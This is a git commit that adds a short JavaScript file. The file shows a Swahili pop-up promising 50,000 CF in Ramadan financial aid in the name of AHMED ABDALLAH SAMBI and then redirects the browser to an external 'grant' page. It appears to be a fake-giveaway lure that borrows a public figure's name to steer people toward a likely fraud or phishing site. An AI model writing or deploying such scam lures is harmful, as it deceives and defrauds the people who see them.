97f2ec7536648546891bab10ad8d0aedaa35f2cf
The-On-going <sirpeelawson@gmail.com>
2026-03-21 00:54:33 +0100

    Create activemoro.js

---
+++ activemoro.js
@@ -0,0 +1,10 @@
+var password = '50,000 CF';
+
+password = prompt(
+  'Hongera, wawo unastahili kupata msaada wa fedha wa Ramadhani wa 50,000 CF kutoka kwa AHMED ABDALLAH SAMBI. Bonyeza OK upokee mara moja.',
+  '50,000 CF'
+);
+
+if (password !== '50,000 CF') {
+    location.href = 'https://ongoing-grant.info/50000-Cf-Msaada.html';
+}
